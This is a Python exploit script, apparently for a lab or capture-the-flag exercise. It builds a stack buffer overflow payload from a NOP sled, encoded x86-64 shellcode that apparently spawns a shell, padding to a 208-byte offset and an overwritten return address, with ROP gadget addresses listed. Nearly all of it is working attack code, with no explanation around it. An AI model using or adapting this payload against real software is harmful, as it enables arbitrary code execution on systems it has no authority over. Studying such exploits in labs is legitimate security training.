import sys
import struct

# gadgets

push_rbp = b'\x04\x5f\xe1\xf7\xff\x7f' # 0x7ffff7e15f04
pop_pop_ret = b'\xf7\x5a\xe1\xf7\xff\x7f' # 0x7ffff7e15af7
add_rsp_by_8 = b'\x18\x66\xe1\xf7\xff\x7f' # 0x7ffff7e16618

# memory until shellcode = $rbp - 208

# call_rax = b'\x80\x60\xe1\xf7\xff\x7f'
rip = b'\x88\xdc\xff\xff\xff\x7f' # 0x7fffffffdc88 -> 0xcccccccc
nop_sled = b'\xcc'*216

## shellcode
shellcode = b''
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff"
shellcode += b"\xff\xff\x48\xbb\xed\x60\xcc\x0b\x24\x4c\x14\x4b\x48\x31\x58"
shellcode += b"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xa5\xd8\xe3\x69\x4d\x22"
shellcode += b"\x3b\x38\x85\x60\x55\x5b\x70\x13\x46\x2d\x85\x4d\xaf\x5f\x7a"
shellcode += b"\x1e\xfc\x43\xed\x60\xcc\x24\x46\x25\x7a\x64\x9e\x08\xcc\x5d"
shellcode += b"\x73\x18\x4a\x21\xd6\x38\xc3\x0e\x24\x4c\x14\x4b"

# shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
# shellcode += b"\xef\xff\xff\xff\x48\xbb\x43\xae\xda\xa7\x94\xcf\x5c"
# shellcode += b"\x03\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
# shellcode += b"\x0b\x16\xf5\xc5\xfd\xa1\x73\x70\x2b\xae\x43\xf7\xc0"
# shellcode += b"\x90\x0e\x65\x2b\x83\xb9\xf3\xca\x9d\xb4\x0b\x43\xae"
# shellcode += b"\xda\x88\xf6\xa6\x32\x2c\x30\xc6\xda\xf1\xc3\x9b\x02"
# shellcode += b"\x69\x78\xf6\xd5\xa2\x94\xcf\x5c\x03"

rip = struct.pack('<Q', 0x7fffffffdb08)

# exploit

buf = b''
buf += b'\x90'*8
buf += shellcode
buf += b'\x90'*(208-len(shellcode))
buf += rip
# buf += pop_pop_ret 

sys.stdout.buffer.write(buf)